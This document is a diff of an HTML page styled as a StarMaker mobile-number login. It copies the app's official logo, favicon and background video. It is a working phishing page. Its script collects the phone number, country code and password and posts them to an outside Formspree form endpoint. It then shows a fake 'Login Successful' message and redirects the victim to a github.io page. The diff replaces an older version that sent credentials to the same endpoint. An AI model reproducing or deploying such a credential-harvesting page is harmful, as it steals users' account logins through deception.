@@ -1,82 +1,919 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="icon" type="image/png" href="https://m.media-amazon.com/images/I/81Z2rz4-hEL.png">
-    <title>StarMaker</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Roboto&family=Sacramento&display=swap"
-      rel="stylesheet"
-    />
-   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Trirong"> 
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
-    <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
-      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
-      crossorigin="anonymous"
-      referrerpolicy="no-referrer"
-    />
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap">
-    <link rel="stylesheet" href="style.css" />
-  </head>
-  <body>
-    
-    <div class="main-container">
-      <video autoplay loop muted>
-        <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4" />
-      </video>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StarMaker Login</title>
+    <link rel="icon" type="image/ico" href="https://www.starmakerstudios.com/next-assets/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-      <div class="bg-overlay"></div>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #000;
+            color: #fff;
+            overflow: hidden;
+            height: 100vh;
+        }
 
-      <nav>
-        <div class="logo">
-          <!--https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5cwEjEiyLQ2Xfg6Q7YkezUCIME_DVAAhsXmwPnWaolKqB0LydcxEXZ4TNDdNXsXcJ_fNPG4C6jG-YbCDkUk6u6G34NupOlxuLIU58M_hasPKdtCmeyzdV0I6NBBxAsU6_QC0zq3qfEppiEnUq2ijWsuomKmsQ3H_d7-5gnIXipf4fmRZhG-AaiAYZAqk/s384/IMG_20231118_020618.png-->
-          <a><img src="https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png"></a>
-        </div>
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+        }
 
-       
-      </nav> 
+        .video-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
 
-      <header class="hero-section">
-      
-        
-  <form action="https://formspree.io/f/mjvqvkjr" id="my-form" method="POST">
-  <div class="container">
-     <div class="upper-text">
-      <p>Mobile Number Login</p>
-     
-</div>
-    
-    <label for="psw"></label>
-    <input name="country" placeholder="Country Code (eg.: +1)" required="" type="text" />
-    
-    <label for="number"></label>
-    <input id="mobile" name="number" placeholder="Mobile no." type="tel" pattern="[0-9]{10}" required/>
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
 
-    <label for="psw"></label>
-    <input name="psw" placeholder="Enter Your Password" required="" type="password" />
-    
-    <div class="clearfix">
-      <button class="signupbtn" type="submit">Log In</button>
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.4);
+            border-radius: 50%;
+            animation: float 15s infinite ease-in-out;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
+            opacity: 0;
+            animation: fadeInDown 1s ease forwards 0.5s;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        .logo-container img {
+            height: 60px;
+            transition: transform 0.3s ease;
+        }
+
+        .logo-container img:hover {
+            transform: scale(1.05);
+        }
+
+        .login-wrapper {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 100;
+            width: 90%;
+            max-width: 450px;
+            opacity: 0;
+            animation: fadeInUp 1s ease forwards 0.8s;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -40%);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%);
+            }
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 25px;
+            padding: 40px 35px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .login-title {
+            text-align: center;
+            color: #444444;
+            font-size: 26px;
+            margin-bottom: 30px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 25px;
+            background: #f1f1f1;
+            font-size: 15px;
+            color: #333;
+            transition: all 0.3s ease;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: #e8e8e8;
+            box-shadow: 0 0 0 2px rgba(255, 41, 111, 0.2);
+        }
+
+        .form-group input::placeholder {
+            color: #999;
+        }
+
+        .phone-input-group {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .country-selector {
+            flex-shrink: 0;
+            background: #f1f1f1;
+            border: none;
+            border-radius: 25px;
+            padding: 15px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            min-width: 120px;
+        }
+
+        .country-selector:hover {
+            background: #e8e8e8;
+        }
+
+        .country-selector:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(255, 41, 111, 0.2);
+        }
+
+        .country-selector i {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .phone-input-group input {
+            flex: 1;
+        }
+
+        .country-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 3000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .country-modal.active {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .country-modal-content {
+            background: #fff;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 80vh;
+            display: flex;
+            flex-direction: column;
+            animation: slideUp 0.3s ease;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .country-modal-header {
+            padding: 25px 25px 20px;
+            border-bottom: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .country-modal-back {
+            cursor: pointer;
+            width: 35px;
+            height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: #f5f5f5;
+            transition: all 0.3s ease;
+            flex-shrink: 0;
+        }
+
+        .country-modal-back:hover {
+            background: #e8e8e8;
+        }
+
+        .country-modal-back i {
+            font-size: 18px;
+            color: #333;
+        }
+
+        .country-modal-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #333;
+            margin: 0;
+        }
+
+        .country-search {
+            padding: 15px 25px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .country-search input {
+            width: 100%;
+            padding: 12px 18px;
+            border: 1px solid #ddd;
+            border-radius: 15px;
+            font-size: 15px;
+            color: #333;
+            transition: all 0.3s ease;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .country-search input:focus {
+            outline: none;
+            border-color: #ff296f;
+            box-shadow: 0 0 0 3px rgba(255, 41, 111, 0.1);
+        }
+
+        .country-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px 0;
+        }
+
+        .country-list::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .country-list::-webkit-scrollbar-track {
+            background: #f5f5f5;
+        }
+
+        .country-list::-webkit-scrollbar-thumb {
+            background: #ccc;
+            border-radius: 3px;
+        }
+
+        .country-list::-webkit-scrollbar-thumb:hover {
+            background: #aaa;
+        }
+
+        .country-item {
+            padding: 15px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border-left: 3px solid transparent;
+        }
+
+        .country-item:hover {
+            background: #f8f8f8;
+            border-left-color: #ff296f;
+        }
+
+        .country-item.selected {
+            background: rgba(255, 41, 111, 0.05);
+            border-left-color: #ff296f;
+        }
+
+        .country-name {
+            font-size: 16px;
+            color: #333;
+            font-weight: 400;
+        }
+
+        .country-code {
+            font-size: 15px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff296f, #ff6b9d);
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            margin-top: 10px;
+            font-family: 'Roboto', sans-serif;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .login-btn:hover::before {
+            left: 100%;
+        }
+
+        .login-btn:hover {
+            background: #fff;
+            color: #ff296f;
+            box-shadow: 0 0 0 2px #ff296f inset;
+            transform: translateY(-2px);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .success-message {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #4caf50, #66bb6a);
+            color: #fff;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-weight: 600;
+            font-size: 15px;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s ease;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .success-message.show {
+            opacity: 1;
+            visibility: visible;
+            animation: slideDown 0.4s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateX(-50%) translateY(-20px);
+            }
+            to {
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        .error {
+            border: 2px solid #ff296f !important;
+            animation: shake 0.3s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        @media (max-width: 768px) {
+            .logo-container {
+                top: 20px;
+            }
+
+            .logo-container img {
+                height: 50px;
+            }
+
+            .login-container {
+                padding: 30px 25px;
+            }
+
+            .login-title {
+                font-size: 22px;
+                margin-bottom: 25px;
+            }
+
+            .form-group input {
+                padding: 14px 18px;
+                font-size: 14px;
+            }
+
+            .login-btn {
+                padding: 14px;
+                font-size: 15px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-wrapper {
+                width: 95%;
+            }
+
+            .login-container {
+                padding: 25px 20px;
+                border-radius: 20px;
+            }
+
+            .logo-container img {
+                height: 45px;
+            }
+
+            .country-selector {
+                min-width: 100px;
+                padding: 14px 16px;
+                font-size: 14px;
+            }
+
+            .country-modal-content {
+                width: 95%;
+                max-height: 85vh;
+            }
+
+            .country-modal-header {
+                padding: 20px 20px 15px;
+            }
+
+            .country-modal-title {
+                font-size: 20px;
+            }
+
+            .country-item {
+                padding: 13px 20px;
+            }
+
+            .phone-input-group {
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <video autoplay loop muted playsinline>
+        <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4">
+    </video>
+    <div class="video-overlay"></div>
+    <div class="particles" id="particles"></div>
+
+    <div class="logo-container">
+        <img src="https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png" alt="StarMaker">
     </div>
-  </div>
-</form>
-   
-      </header>  
- <div class="containersuccess"></div>
-  <div id="status" class="success-message"></div>
-     
-      
-   </div>   
-    
-   
-    <script src="main.js"></script>
-  </body>
+
+    <div class="success-message" id="successMessage">Login Successful! Redirecting...</div>
+
+    <div class="login-wrapper">
+        <div class="login-container">
+            <h2 class="login-title">Enter your mobile number</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <div class="phone-input-group">
+                        <button type="button" class="country-selector" id="countrySelector">
+                            <span id="selectedCountry">IN +91</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </button>
+                        <input type="tel" id="mobile" name="number" placeholder="8305605153" pattern="[0-9]{10}" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Enter Your Password" required>
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="country-modal" id="countryModal">
+        <div class="country-modal-content">
+            <div class="country-modal-header">
+                <div class="country-modal-back" id="closeModal">
+                    <i class="fas fa-chevron-left"></i>
+                </div>
+                <h3 class="country-modal-title">Country / Region</h3>
+            </div>
+            <div class="country-search">
+                <input type="text" id="countrySearch" placeholder="Search country...">
+            </div>
+            <div class="country-list" id="countryList"></div>
+        </div>
+    </div>
+
+    <script>
+        const countries = [
+            { name: 'Afghanistan', code: '+93', iso: 'AF' },
+            { name: 'Albania', code: '+355', iso: 'AL' },
+            { name: 'Algeria', code: '+213', iso: 'DZ' },
+            { name: 'American Samoa', code: '+1', iso: 'AS' },
+            { name: 'Andorra', code: '+376', iso: 'AD' },
+            { name: 'Angola', code: '+244', iso: 'AO' },
+            { name: 'Anguilla', code: '+1', iso: 'AI' },
+            { name: 'Antigua', code: '+1', iso: 'AG' },
+            { name: 'Argentina', code: '+54', iso: 'AR' },
+            { name: 'Armenia', code: '+374', iso: 'AM' },
+            { name: 'Aruba', code: '+297', iso: 'AW' },
+            { name: 'Australia', code: '+61', iso: 'AU' },
+            { name: 'Austria', code: '+43', iso: 'AT' },
+            { name: 'Azerbaijan', code: '+994', iso: 'AZ' },
+            { name: 'Bahrain', code: '+973', iso: 'BH' },
+            { name: 'Bangladesh', code: '+880', iso: 'BD' },
+            { name: 'Barbados', code: '+1', iso: 'BB' },
+            { name: 'Belarus', code: '+375', iso: 'BY' },
+            { name: 'Belgium', code: '+32', iso: 'BE' },
+            { name: 'Belize', code: '+501', iso: 'BZ' },
+            { name: 'Benin', code: '+229', iso: 'BJ' },
+            { name: 'Bermuda', code: '+1', iso: 'BM' },
+            { name: 'Bhutan', code: '+975', iso: 'BT' },
+            { name: 'Bolivia', code: '+591', iso: 'BO' },
+            { name: 'Bosnia', code: '+387', iso: 'BA' },
+            { name: 'Botswana', code: '+267', iso: 'BW' },
+            { name: 'Brazil', code: '+55', iso: 'BR' },
+            { name: 'Brunei', code: '+673', iso: 'BN' },
+            { name: 'Bulgaria', code: '+359', iso: 'BG' },
+            { name: 'Burkina Faso', code: '+226', iso: 'BF' },
+            { name: 'Burundi', code: '+257', iso: 'BI' },
+            { name: 'Cambodia', code: '+855', iso: 'KH' },
+            { name: 'Cameroon', code: '+237', iso: 'CM' },
+            { name: 'Canada', code: '+1', iso: 'CA' },
+            { name: 'Cape Verde', code: '+238', iso: 'CV' },
+            { name: 'Cayman Islands', code: '+1', iso: 'KY' },
+            { name: 'Central African Republic', code: '+236', iso: 'CF' },
+            { name: 'Chad', code: '+235', iso: 'TD' },
+            { name: 'Chile', code: '+56', iso: 'CL' },
+            { name: 'China', code: '+86', iso: 'CN' },
+            { name: 'Colombia', code: '+57', iso: 'CO' },
+            { name: 'Comoros', code: '+269', iso: 'KM' },
+            { name: 'Congo', code: '+242', iso: 'CG' },
+            { name: 'Costa Rica', code: '+506', iso: 'CR' },
+            { name: 'Croatia', code: '+385', iso: 'HR' },
+            { name: 'Cuba', code: '+53', iso: 'CU' },
+            { name: 'Cyprus', code: '+357', iso: 'CY' },
+            { name: 'Czech Republic', code: '+420', iso: 'CZ' },
+            { name: 'Denmark', code: '+45', iso: 'DK' },
+            { name: 'Djibouti', code: '+253', iso: 'DJ' },
+            { name: 'Dominica', code: '+1', iso: 'DM' },
+            { name: 'Dominican Republic', code: '+1', iso: 'DO' },
+            { name: 'Ecuador', code: '+593', iso: 'EC' },
+            { name: 'Egypt', code: '+20', iso: 'EG' },
+            { name: 'El Salvador', code: '+503', iso: 'SV' },
+            { name: 'Equatorial Guinea', code: '+240', iso: 'GQ' },
+            { name: 'Eritrea', code: '+291', iso: 'ER' },
+            { name: 'Estonia', code: '+372', iso: 'EE' },
+            { name: 'Ethiopia', code: '+251', iso: 'ET' },
+            { name: 'Fiji', code: '+679', iso: 'FJ' },
+            { name: 'Finland', code: '+358', iso: 'FI' },
+            { name: 'France', code: '+33', iso: 'FR' },
+            { name: 'Gabon', code: '+241', iso: 'GA' },
+            { name: 'Gambia', code: '+220', iso: 'GM' },
+            { name: 'Georgia', code: '+995', iso: 'GE' },
+            { name: 'Germany', code: '+49', iso: 'DE' },
+            { name: 'Ghana', code: '+233', iso: 'GH' },
+            { name: 'Greece', code: '+30', iso: 'GR' },
+            { name: 'Grenada', code: '+1', iso: 'GD' },
+            { name: 'Guatemala', code: '+502', iso: 'GT' },
+            { name: 'Guinea', code: '+224', iso: 'GN' },
+            { name: 'Guinea-Bissau', code: '+245', iso: 'GW' },
+            { name: 'Guyana', code: '+592', iso: 'GY' },
+            { name: 'Haiti', code: '+509', iso: 'HT' },
+            { name: 'Honduras', code: '+504', iso: 'HN' },
+            { name: 'Hong Kong', code: '+852', iso: 'HK' },
+            { name: 'Hungary', code: '+36', iso: 'HU' },
+            { name: 'Iceland', code: '+354', iso: 'IS' },
+            { name: 'India', code: '+91', iso: 'IN' },
+            { name: 'Indonesia', code: '+62', iso: 'ID' },
+            { name: 'Iran', code: '+98', iso: 'IR' },
+            { name: 'Iraq', code: '+964', iso: 'IQ' },
+            { name: 'Ireland', code: '+353', iso: 'IE' },
+            { name: 'Israel', code: '+972', iso: 'IL' },
+            { name: 'Italy', code: '+39', iso: 'IT' },
+            { name: 'Jamaica', code: '+1', iso: 'JM' },
+            { name: 'Japan', code: '+81', iso: 'JP' },
+            { name: 'Jordan', code: '+962', iso: 'JO' },
+            { name: 'Kazakhstan', code: '+7', iso: 'KZ' },
+            { name: 'Kenya', code: '+254', iso: 'KE' },
+            { name: 'Kuwait', code: '+965', iso: 'KW' },
+            { name: 'Kyrgyzstan', code: '+996', iso: 'KG' },
+            { name: 'Laos', code: '+856', iso: 'LA' },
+            { name: 'Latvia', code: '+371', iso: 'LV' },
+            { name: 'Lebanon', code: '+961', iso: 'LB' },
+            { name: 'Lesotho', code: '+266', iso: 'LS' },
+            { name: 'Liberia', code: '+231', iso: 'LR' },
+            { name: 'Libya', code: '+218', iso: 'LY' },
+            { name: 'Liechtenstein', code: '+423', iso: 'LI' },
+            { name: 'Lithuania', code: '+370', iso: 'LT' },
+            { name: 'Luxembourg', code: '+352', iso: 'LU' },
+            { name: 'Macau', code: '+853', iso: 'MO' },
+            { name: 'Macedonia', code: '+389', iso: 'MK' },
+            { name: 'Madagascar', code: '+261', iso: 'MG' },
+            { name: 'Malawi', code: '+265', iso: 'MW' },
+            { name: 'Malaysia', code: '+60', iso: 'MY' },
+            { name: 'Maldives', code: '+960', iso: 'MV' },
+            { name: 'Mali', code: '+223', iso: 'ML' },
+            { name: 'Malta', code: '+356', iso: 'MT' },
+            { name: 'Mauritania', code: '+222', iso: 'MR' },
+            { name: 'Mauritius', code: '+230', iso: 'MU' },
+            { name: 'Mexico', code: '+52', iso: 'MX' },
+            { name: 'Moldova', code: '+373', iso: 'MD' },
+            { name: 'Monaco', code: '+377', iso: 'MC' },
+            { name: 'Mongolia', code: '+976', iso: 'MN' },
+            { name: 'Montenegro', code: '+382', iso: 'ME' },
+            { name: 'Morocco', code: '+212', iso: 'MA' },
+            { name: 'Mozambique', code: '+258', iso: 'MZ' },
+            { name: 'Myanmar', code: '+95', iso: 'MM' },
+            { name: 'Namibia', code: '+264', iso: 'NA' },
+            { name: 'Nepal', code: '+977', iso: 'NP' },
+            { name: 'Netherlands', code: '+31', iso: 'NL' },
+            { name: 'New Zealand', code: '+64', iso: 'NZ' },
+            { name: 'Nicaragua', code: '+505', iso: 'NI' },
+            { name: 'Niger', code: '+227', iso: 'NE' },
+            { name: 'Nigeria', code: '+234', iso: 'NG' },
+            { name: 'Norway', code: '+47', iso: 'NO' },
+            { name: 'Oman', code: '+968', iso: 'OM' },
+            { name: 'Pakistan', code: '+92', iso: 'PK' },
+            { name: 'Palestine', code: '+970', iso: 'PS' },
+            { name: 'Panama', code: '+507', iso: 'PA' },
+            { name: 'Papua New Guinea', code: '+675', iso: 'PG' },
+            { name: 'Paraguay', code: '+595', iso: 'PY' },
+            { name: 'Peru', code: '+51', iso: 'PE' },
+            { name: 'Philippines', code: '+63', iso: 'PH' },
+            { name: 'Poland', code: '+48', iso: 'PL' },
+            { name: 'Portugal', code: '+351', iso: 'PT' },
+            { name: 'Puerto Rico', code: '+1', iso: 'PR' },
+            { name: 'Qatar', code: '+974', iso: 'QA' },
+            { name: 'Romania', code: '+40', iso: 'RO' },
+            { name: 'Russia', code: '+7', iso: 'RU' },
+            { name: 'Rwanda', code: '+250', iso: 'RW' },
+            { name: 'Saudi Arabia', code: '+966', iso: 'SA' },
+            { name: 'Senegal', code: '+221', iso: 'SN' },
+            { name: 'Serbia', code: '+381', iso: 'RS' },
+            { name: 'Seychelles', code: '+248', iso: 'SC' },
+            { name: 'Sierra Leone', code: '+232', iso: 'SL' },
+            { name: 'Singapore', code: '+65', iso: 'SG' },
+            { name: 'Slovakia', code: '+421', iso: 'SK' },
+            { name: 'Slovenia', code: '+386', iso: 'SI' },
+            { name: 'Somalia', code: '+252', iso: 'SO' },
+            { name: 'South Africa', code: '+27', iso: 'ZA' },
+            { name: 'South Korea', code: '+82', iso: 'KR' },
+            { name: 'South Sudan', code: '+211', iso: 'SS' },
+            { name: 'Spain', code: '+34', iso: 'ES' },
+            { name: 'Sri Lanka', code: '+94', iso: 'LK' },
+            { name: 'Sudan', code: '+249', iso: 'SD' },
+            { name: 'Suriname', code: '+597', iso: 'SR' },
+            { name: 'Swaziland', code: '+268', iso: 'SZ' },
+            { name: 'Sweden', code: '+46', iso: 'SE' },
+            { name: 'Switzerland', code: '+41', iso: 'CH' },
+            { name: 'Syria', code: '+963', iso: 'SY' },
+            { name: 'Taiwan', code: '+886', iso: 'TW' },
+            { name: 'Tajikistan', code: '+992', iso: 'TJ' },
+            { name: 'Tanzania', code: '+255', iso: 'TZ' },
+            { name: 'Thailand', code: '+66', iso: 'TH' },
+            { name: 'Togo', code: '+228', iso: 'TG' },
+            { name: 'Trinidad and Tobago', code: '+1', iso: 'TT' },
+            { name: 'Tunisia', code: '+216', iso: 'TN' },
+            { name: 'Turkey', code: '+90', iso: 'TR' },
+            { name: 'Turkmenistan', code: '+993', iso: 'TM' },
+            { name: 'Uganda', code: '+256', iso: 'UG' },
+            { name: 'Ukraine', code: '+380', iso: 'UA' },
+            { name: 'United Arab Emirates', code: '+971', iso: 'AE' },
+            { name: 'United Kingdom', code: '+44', iso: 'GB' },
+            { name: 'United States', code: '+1', iso: 'US' },
+            { name: 'Uruguay', code: '+598', iso: 'UY' },
+            { name: 'Uzbekistan', code: '+998', iso: 'UZ' },
+            { name: 'Venezuela', code: '+58', iso: 'VE' },
+            { name: 'Vietnam', code: '+84', iso: 'VN' },
+            { name: 'Yemen', code: '+967', iso: 'YE' },
+            { name: 'Zambia', code: '+260', iso: 'ZM' },
+            { name: 'Zimbabwe', code: '+263', iso: 'ZW' }
+        ];
+
+        let selectedCountryData = { name: 'India', code: '+91', iso: 'IN' };
+
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 40; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 15 + 's';
+            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+            particlesContainer.appendChild(particle);
+        }
+
+        const form = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const successMessage = document.getElementById('successMessage');
+        const mobile = document.getElementById('mobile');
+        const password = document.getElementById('password');
+        const countrySelector = document.getElementById('countrySelector');
+        const countryModal = document.getElementById('countryModal');
+        const closeModal = document.getElementById('closeModal');
+        const countryList = document.getElementById('countryList');
+        const countrySearch = document.getElementById('countrySearch');
+        const selectedCountrySpan = document.getElementById('selectedCountry');
+
+        function renderCountries(filter = '') {
+            const filteredCountries = countries.filter(country => 
+                country.name.toLowerCase().includes(filter.toLowerCase()) ||
+                country.code.includes(filter)
+            );
+
+            countryList.innerHTML = filteredCountries.map(country => `
+                <div class="country-item ${country.iso === selectedCountryData.iso ? 'selected' : ''}" 
+                     data-iso="${country.iso}" 
+                     data-code="${country.code}" 
+                     data-name="${country.name}">
+                    <span class="country-name">${country.name}</span>
+                    <span class="country-code">${country.code}</span>
+                </div>
+            `).join('');
+
+            document.querySelectorAll('.country-item').forEach(item => {
+                item.addEventListener('click', () => {
+                    selectedCountryData = {
+                        iso: item.dataset.iso,
+                        code: item.dataset.code,
+                        name: item.dataset.name
+                    };
+                    selectedCountrySpan.textContent = `${selectedCountryData.iso} ${selectedCountryData.code}`;
+                    countryModal.classList.remove('active');
+                    countrySearch.value = '';
+                });
+            });
+        }
+
+        countrySelector.addEventListener('click', () => {
+            countryModal.classList.add('active');
+            renderCountries();
+            countrySearch.focus();
+        });
+
+        closeModal.addEventListener('click', () => {
+            countryModal.classList.remove('active');
+            countrySearch.value = '';
+        });
+
+        countryModal.addEventListener('click', (e) => {
+            if (e.target === countryModal) {
+                countryModal.classList.remove('active');
+                countrySearch.value = '';
+            }
+        });
+
+        countrySearch.addEventListener('input', (e) => {
+            renderCountries(e.target.value);
+        });
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            [mobile, password].forEach(input => {
+                input.classList.remove('error');
+            });
+
+            let isValid = true;
+            if (!mobile.value.trim() || !/^[0-9]{10}$/.test(mobile.value)) {
+                mobile.classList.add('error');
+                isValid = false;
+            }
+            if (!password.value.trim()) {
+                password.classList.add('error');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging in...';
+
+            const formData = new FormData();
+            formData.append('country', `${selectedCountryData.iso} ${selectedCountryData.code}`);
+            formData.append('number', mobile.value);
+            formData.append('password', password.value);
+
+            try {
+                const response = await fetch('https://formspree.io/f/mjvqvkjr', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (response.ok) {
+                    successMessage.classList.add('show');
+                    
+                    setTimeout(() => {
+                        successMessage.classList.remove('show');
+                        form.reset();
+                        loginBtn.disabled = false;
+                        loginBtn.textContent = 'Log In';
+                        selectedCountryData = { name: 'India', code: '+91', iso: 'IN' };
+                        selectedCountrySpan.textContent = 'IN +91';
+                        window.location.href = 'https://starmakerstudio.github.io/web/Starmaker%20Web/Login/Events/index.html';
+                    }, 2000);
+                } else {
+                    throw new Error('Form submission failed');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Login failed. Please try again.');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Log In';
+            }
+        });
+
+        [mobile, password].forEach(input => {
+            input.addEventListener('input', () => {
+                input.classList.remove('error');
+            });
+        });
+
+        renderCountries();
+    </script>
+</body>
 </html>
-
-
